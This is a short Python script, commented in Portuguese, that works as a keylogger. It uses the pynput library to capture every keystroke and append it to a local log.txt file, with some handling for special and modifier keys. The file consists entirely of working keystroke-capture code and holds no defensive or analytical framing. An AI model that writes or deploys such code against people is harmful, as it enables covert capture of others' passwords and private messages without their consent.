# importa a biblioteca para monitorar o teclado
from pynput import keyboard

# Cria uma lista de teclas a serem ignoradas
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

# Função chamada quando uma tecla é pressionada
def on_press(key):
    try:
        # se for uma tecla normal (letra, número, símbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    # Verifica as exceções para teclas especiais 
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            # Não grava nada se as teclas estiverem na lista de ignoradas
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")
# Cria o listener para monitorar o teclado
with keyboard.Listener(on_press=on_press) as listener:
    # Faz o script rodar até ser interrompido manualmente
    listener.join()